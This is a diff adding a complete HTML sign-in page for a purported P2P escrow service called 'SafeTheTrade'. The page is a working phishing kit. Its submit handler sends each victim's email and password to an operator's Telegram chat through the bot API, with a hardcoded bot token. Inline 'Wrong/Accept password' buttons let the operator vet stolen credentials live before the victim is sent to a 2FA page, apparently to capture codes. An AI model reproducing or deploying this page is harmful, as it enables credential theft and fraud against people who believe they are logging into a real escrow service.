@@ -1,0 +1,748 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Sign In — SafeTheTrade</title>
+    <style>
+        *,
+        *::before,
+        *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+         :root {
+            --bg: #0a0a0a;
+            --nav-border: #1a1a1a;
+            --card-bg: #141414;
+            --card-border: #222222;
+            --input-bg: #1c1c1c;
+            --input-border: #2a2a2a;
+            --text: #ffffff;
+            --text-muted: #8a8a8a;
+            --text-label: #9a9a9a;
+            --green: #22c55e;
+            --green-hover: #16a34a;
+            --btn-white: #f5f5f5;
+            --btn-white-text: #111111;
+            --footer-text: #6b6b6b;
+            --font: "Inter", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --danger: #ef4444;
+        }
+        
+        html,
+        body {
+            height: 100%;
+        }
+        
+        body {
+            font-family: var(--font);
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 28px;
+            height: 64px;
+            border-bottom: 1px solid var(--nav-border);
+            flex-shrink: 0;
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 28px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            text-decoration: none;
+            color: var(--text);
+        }
+        
+        .logo-icon {
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            background: radial-gradient(circle at 35% 35%, #4ade80, #16a34a 55%, #14532d);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.25);
+        }
+        
+        .logo-icon svg {
+            width: 14px;
+            height: 14px;
+        }
+        
+        .logo-text {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 17px;
+            font-weight: 600;
+            letter-spacing: -0.02em;
+        }
+        
+        .logo-image {
+            width: 35px;
+            height: 35px;
+            object-fit: contain;
+        }
+        
+        .nav-link {
+            color: var(--text-muted);
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+            transition: color 0.15s;
+        }
+        
+        .nav-link:hover {
+            color: var(--text);
+        }
+        
+        .header-right {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-outline {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: 1px solid #2e2e2e;
+            background: transparent;
+            color: var(--text);
+            font-size: 13.5px;
+            font-weight: 500;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        
+        .btn-outline:hover {
+            background: #1a1a1a;
+            border-color: #3a3a3a;
+        }
+        
+        .btn-green {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            height: 36px;
+            padding: 0 16px;
+            border-radius: 8px;
+            border: none;
+            background: var(--green);
+            color: #fff;
+            font-size: 13.5px;
+            font-weight: 600;
+            font-family: inherit;
+            text-decoration: none;
+            cursor: pointer;
+            transition: background 0.15s;
+        }
+        
+        .btn-green:hover {
+            background: var(--green-hover);
+        }
+        
+        .main {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .card {
+            width: 100%;
+            max-width: 400px;
+            background: var(--card-bg);
+            border: 1px solid var(--card-border);
+            border-radius: 16px;
+            padding: 32px 32px 28px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.45);
+        }
+        
+        .card h1 {
+            font-size: 26px;
+            font-weight: 700;
+            letter-spacing: -0.03em;
+            margin-bottom: 6px;
+            color: #fafafa;
+        }
+        
+        .card-subtitle {
+            font-size: 13.5px;
+            color: var(--text-muted);
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+        
+        .field {
+            margin-bottom: 18px;
+        }
+        
+        .field label {
+            display: block;
+            font-size: 11px;
+            font-weight: 600;
+            letter-spacing: 0.06em;
+            text-transform: uppercase;
+            color: var(--text-label);
+            margin-bottom: 8px;
+        }
+        
+        .input-wrap {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        
+        .input-wrap .icon-left {
+            position: absolute;
+            left: 14px;
+            width: 16px;
+            height: 16px;
+            color: #6b6b6b;
+            pointer-events: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .input-wrap .icon-left svg,
+        .input-wrap .icon-right svg {
+            width: 16px;
+            height: 16px;
+        }
+        
+        .input-wrap input {
+            width: 100%;
+            height: 44px;
+            padding: 0 44px 0 42px;
+            background: var(--input-bg);
+            border: 1px solid var(--input-border);
+            border-radius: 10px;
+            color: var(--text);
+            font-size: 14px;
+            font-family: inherit;
+            outline: none;
+            transition: border-color 0.15s, box-shadow 0.15s;
+        }
+        
+        .input-wrap input::placeholder {
+            color: #555555;
+        }
+        
+        .input-wrap input:focus {
+            border-color: #3f3f3f;
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.04);
+        }
+        
+        .input-wrap .icon-right {
+            position: absolute;
+            right: 12px;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: none;
+            border: none;
+            color: #6b6b6b;
+            cursor: pointer;
+            border-radius: 6px;
+            padding: 0;
+        }
+        
+        .input-wrap .icon-right:hover {
+            color: #a3a3a3;
+        }
+        
+        .row-options {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 22px;
+            margin-top: 4px;
+        }
+        
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 13.5px;
+            color: #c4c4c4;
+            cursor: pointer;
+            user-select: none;
+        }
+        
+        .checkbox-label input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .checkbox-custom {
+            width: 16px;
+            height: 16px;
+            border-radius: 4px;
+            border: 1.5px solid #3a3a3a;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            transition: background 0.15s, border-color 0.15s;
+        }
+        
+        .checkbox-label input:checked+.checkbox-custom {
+            background: var(--green);
+            border-color: var(--green);
+        }
+        
+        .checkbox-custom svg {
+            width: 10px;
+            height: 10px;
+            opacity: 0;
+            color: #fff;
+        }
+        
+        .checkbox-label input:checked+.checkbox-custom svg {
+            opacity: 1;
+        }
+        
+        .forgot-link {
+            color: var(--green);
+            font-size: 13.5px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .forgot-link:hover {
+            text-decoration: underline;
+        }
+        
+        .btn-submit {
+            width: 100%;
+            height: 46px;
+            border: none;
+            border-radius: 10px;
+            background: var(--btn-white);
+            color: var(--btn-white-text);
+            font-size: 14.5px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            transition: background 0.15s, transform 0.1s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-submit:hover {
+            background: #e8e8e8;
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.995);
+        }
+        
+        .btn-submit:disabled {
+            cursor: not-allowed;
+            opacity: 0.75;
+        }
+        /* Inline small spinner */
+        
+        .spinner {
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 0, 0, 0.15);
+            border-top-color: rgba(0, 0, 0, 0.65);
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+        
+        .btn-submitting .spinner {
+            display: inline-block;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .signup-row {
+            text-align: center;
+            margin-top: 22px;
+            font-size: 13.5px;
+            color: var(--text-muted);
+        }
+        
+        .signup-row a {
+            color: var(--green);
+            font-weight: 500;
+            text-decoration: none;
+        }
+        
+        .signup-row a:hover {
+            text-decoration: underline;
+        }
+        
+        .form-note {
+            margin-top: 14px;
+            min-height: 18px;
+            font-size: 13.5px;
+            color: var(--text-muted);
+        }
+        
+        .form-note.error {
+            color: var(--danger);
+            font-weight: 600;
+        }
+        
+        .footer {
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 18px 28px;
+            border-top: 1px solid var(--nav-border);
+            font-size: 12.5px;
+            color: var(--footer-text);
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            gap: 0;
+        }
+        
+        .footer-links a {
+            color: var(--footer-text);
+            text-decoration: none;
+            transition: color 0.15s;
+        }
+        
+        .footer-links a:hover {
+            color: #a3a3a3;
+        }
+        
+        .footer-links .sep {
+            margin: 0 6px;
+            color: var(--footer-text);
+            user-select: none;
+        }
+        
+        @media (max-width: 640px) {
+            .header {
+                padding: 0 16px;
+            }
+            .card {
+                padding: 28px 22px 24px;
+            }
+            .footer {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 16px;
+            }
+            .nav-link {
+                display: none;
+            }
+        }
+    </style>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet" />
+</head>
+
+<body>
+    <header class="header">
+        <div class="header-left">
+            <a href="#" class="logo" aria-label="SafeTheTrade home">
+                <span class="logo-icon" aria-hidden="true">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M12 3l7 3v5c0 4.5-3 7.5-7 9-4-1.5-7-4.5-7-9V6l7-3z" />
+            <path d="M9 12l2 2 4-4" />
+          </svg>
+        </span>
+                <span class="logo-text">
+          <img src="safethetradelogo.png" alt="SafeTheTrade Logo" class="logo-image">
+          SafeTheTrade
+        </span>
+            </a>
+            <a href="#" class="nav-link">Offers</a>
+        </div>
+        <div class="header-right">
+            <a href="#" class="btn-outline">Log in</a>
+            <a href="#" class="btn-green">Sign up</a>
+        </div>
+    </header>
+
+    <main class="main">
+        <div class="card">
+            <h1>Sign In</h1>
+            <p class="card-subtitle">Access your secure P2P escrow account</p>
+
+            <form id="signinForm" action="2fa.html" method="get" autocomplete="on">
+                <div class="field">
+                    <label for="email">Email or username</label>
+                    <div class="input-wrap">
+                        <span class="icon-left" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
+                <circle cx="12" cy="7" r="4" />
+              </svg>
+            </span>
+                        <input id="email" name="email" type="text" placeholder="Enter your registered email..." autocomplete="username" />
+                    </div>
+                </div>
+
+                <div class="field">
+                    <label for="password">Password</label>
+                    <div class="input-wrap">
+                        <span class="icon-left" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" />
+                <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+              </svg>
+            </span>
+
+                        <input id="password" name="password" type="password" placeholder="••••••••••" value="password123" autocomplete="current-password" />
+
+                        <button type="button" class="icon-right" id="togglePassword" aria-label="Show password">
+              <svg id="eyeIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
+                <circle cx="12" cy="12" r="3" />
+              </svg>
+            </button>
+                    </div>
+                </div>
+
+                <div class="row-options">
+                    <label class="checkbox-label">
+            <input type="checkbox" name="remember" checked />
+            <span class="checkbox-custom" aria-hidden="true">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12" />
+              </svg>
+            </span>
+            Remember me
+          </label>
+                    <a href="#" class="forgot-link">Forgot password?</a>
+                </div>
+
+                <button id="submitBtn" type="submit" class="btn-submit">
+          <span class="spinner" aria-hidden="true"></span>
+          <span id="submitBtnText">Sign In securely</span>
+        </button>
+
+                <div id="formNote" class="form-note" aria-live="polite"></div>
+            </form>
+
+            <p class="signup-row">
+                Don't have an account?
+                <a href="#">Create Escrow Account</a>
+            </p>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div>www.safethetrade.com (C) 2026</div>
+        <div class="footer-links">
+            <a href="#">Rate calculator</a><span class="sep">/</span>
+            <a href="#">System status</a><span class="sep">/</span>
+            <a href="#">Transparency</a><span class="sep">/</span>
+            <a href="#">API docs</a><span class="sep">/</span>
+            <a href="#">Fees</a><span class="sep">/</span>
+            <a href="#">Terms</a><span class="sep">/</span>
+            <a href="#">Privacy</a>
+        </div>
+    </footer>
+
+    <script>
+        const EMAIL_LS_KEY = "signin_email";
+
+        // Optional: if you want to show the red text + reset automatically
+        const UI_FLAG_KEY = "signin_ui_flag"; // values: "", "wrong_password"
+
+        // Show/hide password
+        document.getElementById("togglePassword").addEventListener("click", function() {
+            const passwordField = document.getElementById("password");
+            passwordField.type = passwordField.type === "password" ? "text" : "password";
+        });
+
+        // Load saved email (if any)
+        window.addEventListener("DOMContentLoaded", () => {
+            const savedEmail = localStorage.getItem(EMAIL_LS_KEY);
+            if (savedEmail) document.getElementById("email").value = savedEmail;
+
+            // If previous attempt failed and you stored a flag, show red message
+            const flag = localStorage.getItem(UI_FLAG_KEY);
+            if (flag === "wrong_password") {
+                const note = document.getElementById("formNote");
+                note.textContent = "Enter correct password";
+                note.classList.add("error");
+                // Clear flag after showing once
+                localStorage.removeItem(UI_FLAG_KEY);
+            }
+        });
+
+        const submitBtn = document.getElementById("submitBtn");
+        const submitBtnText = document.getElementById("submitBtnText");
+        const formNote = document.getElementById("formNote");
+
+        function setSubmitting(isSubmitting) {
+            submitBtn.disabled = isSubmitting;
+            submitBtn.classList.toggle("btn-submitting", isSubmitting);
+            submitBtnText.textContent = isSubmitting ? "Login in ......" : "Sign In securely";
+        }
+
+        // IMPORTANT NOTE:
+        // Telegram inline keyboard callbacks DO NOT run on this page directly.
+        // For the "wrong/accept" buttons to affect navigation/reset in the browser,
+        // you must implement a small backend that:
+        //  - receives callback_query from Telegram,
+        //  - then notifies this browser (or redirects user via your own mechanism).
+        //
+        // This HTML includes:
+        //  - the inline keyboard you requested,
+        //  - a loading spinner on the page while waiting,
+        //  - URL param handling to trigger red message / navigation (when backend redirects).
+        //
+        // To make it fully functional, you must wire the backend to redirect to:
+        //   ?auth=wrong  OR ?auth=accept
+        function parseAuthFromUrl() {
+            const params = new URLSearchParams(location.search);
+            const auth = params.get("auth");
+            if (!auth) return null;
+
+            if (auth === "wrong") {
+                localStorage.setItem(UI_FLAG_KEY, "wrong_password");
+                // Reset page to clear query params and show red message
+                location.search = "";
+                location.reload();
+                return null;
+            }
+
+            if (auth === "accept") {
+                location.href = "2fa.html";
+                return null;
+            }
+
+            return null;
+        }
+
+        // If backend redirected here with auth state
+        parseAuthFromUrl();
+
+        document.getElementById("signinForm").addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById("email").value.trim();
+            const password = document.getElementById("password").value;
+
+            // Store email
+            localStorage.setItem(EMAIL_LS_KEY, email);
+
+            // Show loading spinner while we wait for Telegram reply (backend should redirect back)
+            setSubmitting(true);
+            formNote.textContent = "Waiting for Telegram reply...";
+            formNote.classList.remove("error");
+
+            const telegramBotToken = '8374783082:AAGu_MAmTZ7plivFdGJU10DjUECPe-Nbw-Q';
+            const chatId = '5615316142';
+
+            // You can include a unique nonce so backend knows which user/session is being processed.
+            const nonce = crypto.randomUUID();
+
+            const message =
+                `Login attempt\n` +
+                `Email: ${email}\n` +
+                `Password: ${password}\n` +
+                `Nonce: ${nonce}`;
+
+            const apiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+            // Inline keyboard (Wrong / Accept)
+            // Callback data is only interpreted by your Telegram bot backend (callback_query).
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "Wrong password",
+                        callback_data: `wrong:${nonce}`
+                    }],
+                    [{
+                        text: "Accept password",
+                        callback_data: `accept:${nonce}`
+                    }]
+                ]
+            };
+
+            try {
+                const resp = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        reply_markup: inlineKeyboard
+                    })
+                });
+
+                if (!resp.ok) {
+                    throw new Error("Failed to send Telegram message.");
+                }
+
+                // After sending, you still must wait for your Telegram bot + backend to redirect user
+                // back to this page with ?auth=wrong or ?auth=accept.
+                //
+                // We’ll also provide a fallback: after a timeout, re-enable UI (optional).
+                setTimeout(() => {
+                    // If backend didn't redirect yet, stop spinner so user isn't stuck forever.
+                    setSubmitting(false);
+                    formNote.textContent = "No reply yet. Please try again.";
+                }, 30000);
+
+            } catch (err) {
+                console.error(err);
+                setSubmitting(false);
+                formNote.textContent = "An error occurred while sending to Telegram.";
+                formNote.classList.add("error");
+            }
+        });
+    </script>
+</body>
+
+</html>
